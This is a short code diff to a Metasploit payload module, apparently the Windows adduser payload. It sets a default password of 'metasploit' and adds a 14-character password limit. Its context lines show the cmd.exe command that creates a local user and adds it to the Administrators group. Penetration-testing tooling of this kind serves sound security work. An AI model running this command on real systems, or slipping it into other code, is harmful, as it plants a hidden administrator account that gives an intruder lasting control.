@@ -38,7 +38,7 @@ module Metasploit3
 		register_options(
 			[
 				OptString.new('USER', [ true, "The username to create",     "metasploit" ]),
-				OptString.new('PASS', [ true, "The password for this user", ""           ]),
+				OptString.new('PASS', [ true, "The password for this user", "metasploit" ]),
 			], self.class)
 
 		# Hide the CMD option...this is kinda ugly
@@ -51,6 +51,10 @@ module Metasploit3
 	def command_string
 		user = datastore['USER'] || 'metasploit'
 		pass = datastore['PASS'] || ''
+		
+		if(pass.length > 14)
+			raise ArgumentError, "Password for the adduser payload must be 14 characters or less"
+		end	
 
 		return "cmd.exe /c net user #{user} #{pass} /ADD && " +
 			"net localgroup Administrators #{user} /ADD"
